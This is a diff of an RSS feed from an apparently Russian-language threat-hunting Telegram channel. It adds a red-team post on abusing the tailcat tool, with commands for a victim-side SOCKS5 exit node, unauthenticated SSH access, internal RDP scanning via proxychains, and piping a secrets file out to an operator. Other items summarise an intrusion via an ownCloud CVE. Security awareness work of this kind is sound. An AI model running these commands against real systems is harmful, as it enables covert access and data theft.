@@ -1,5 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Thu, 27 Aug 2026 14:36:27 +0000</lastBuildDate><item><title>Message 1458</title><link>https://t.me/ThreatHuntingFather/1458</link><description/><pubDate>Thu, 27 Aug 2026 14:36:27 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1458</guid></item><item><title>🤖🤖🤖🤖🤖🤖🤖🤖</title><link>https://t.me/ThreatHuntingFather/1457</link><description>🤖🤖🤖🤖🤖🤖🤖🤖
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Mon, 31 Aug 2026 11:08:14 +0000</lastBuildDate><item><title>TailCat Red Team use case 😎</title><link>https://t.me/ThreatHuntingFather/1459</link><description>TailCat Red Team use case 😎
+Несколько дней назад ребята из TailScale выпустили свой инструмент tailcat, как можно понять из названия, это аналог netcat но работающий из коробки через сеть TailScale 🤩
+Первой моей мыслью стало что инструментом начнут активно пользоваться атакующие и решил расписать разные примеры применения нового "условно легитимного" софта 😃
+🔢  SOCKS5 Reverse Proxy
+Можно использовать машину жертвы как exit-node и через неё получать доступ к внутренней сети. На машине жертвы запускаем следующую команду:
+tailcat --serve=exit-node
+По умолчанию tailcat socks поднимает SOCKS5 на случайном порту и передаёт адрес и порт через переменную окружения. Чтобы не возиться с этим каждый раз, я написал небольшой wrapper под названием tcsocks, который поднимает локальный SOCKS5 на 1080 (порт можно поменять).  На машине оператора запускаем:
+tcsocks -q &lt;token&gt;
+А дальше как обычно пользуемся proxychains:
+proxychains -f proxy.conf -q nxc rdp 192.168.0.0/24
+🔢 SSH доступ без авторизации
+Tailcat также позволяет в user mode слушать SSH от пользователя, без необходимости вводить пароль, это особенно удобно если был нестабильный шелл и нужно было использовать альтернативный канал. Сперва слушаем No Auth SSH на машине жертвы:
+tailcat --serve=no-auth-ssh
+Далее подключаемся по токену с машины оператора:
+tailcat ssh &lt;token&gt;
+🔢 Эксфильтрация данных через pipe
+Ну и классика - эксфильтрация файлов через pipe на машине жертвы запускаем:
+cat secret.txt | tailcat &lt;token&gt;
+На машине оператора запускаем:
+tailcat &gt; secret.txt
+Из плюсов вижу то, что инструмент условно легитимный и работает из коробки, с открытым исходным кодом который можно кастомизировать под свои нужды 😎
+💻 tcsocks: https://gist.github.com/s0ld13rr/18e2765da1831af0a656e7bb0a819e73
+💻 tailcat: https://github.com/tailscale/tailcat
+🧢 s0ld13r
+
+[Media: Фото]</description><pubDate>Mon, 31 Aug 2026 11:08:14 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1459</guid></item><item><title>Message 1458</title><link>https://t.me/ThreatHuntingFather/1458</link><description/><pubDate>Thu, 27 Aug 2026 14:36:27 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1458</guid></item><item><title>🤖🤖🤖🤖🤖🤖🤖🤖</title><link>https://t.me/ThreatHuntingFather/1457</link><description>🤖🤖🤖🤖🤖🤖🤖🤖
 https://openai.com/index/hugging-face-incident-and-the-road-ahead/</description><pubDate>Thu, 27 Aug 2026 11:53:45 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1457</guid></item><item><title>Philippine Nuclear Agency and Naval Contractor Targeted ☢️</title><link>https://t.me/ThreatHuntingFather/1456</link><description>Philippine Nuclear Agency and Naval Contractor Targeted ☢️
 Hunt.io platform flagged an open directory in August staging active intrusion tooling and exfiltrated data from two Philippine organizations - a nuclear research body and a marine engineering company contracted to the Philippine Navy.
 📌ownCloud compromised via CVE-2023-49105 - the pre-signed URL mechanism accepted an empty signing secret, which is the default state on new installs, allowing unauthenticated WebDAV file retrieval
